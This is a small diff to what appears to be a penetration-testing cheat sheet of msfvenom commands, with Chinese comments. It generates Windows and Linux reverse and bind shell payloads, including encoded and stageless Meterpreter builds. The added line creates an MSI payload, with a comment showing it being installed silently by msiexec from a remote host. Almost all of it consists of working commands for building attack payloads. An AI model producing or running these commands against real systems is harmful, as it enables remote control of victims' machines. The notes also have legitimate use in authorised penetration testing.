@@ -68,6 +68,8 @@ msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.2.157 -e x86/shika
 # 默认的stageless payload只会包含stageless，所以如果想将stdapi和priv两个组建给包含进去的华我们可以用extensions命令：
 msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSIONS=stdapi,priv -f exe -o stageless.exe
 
+msfvenom -p windows/exec CMD='calc.exe' -f msi > calc.msi # msiexec /q /i http://tools.imortal.icu/calc.msi
+
 # Linux
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.50.80 LPORT=1234 -f elf > shell.elf
 msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=1234 -f elf > shell.elf
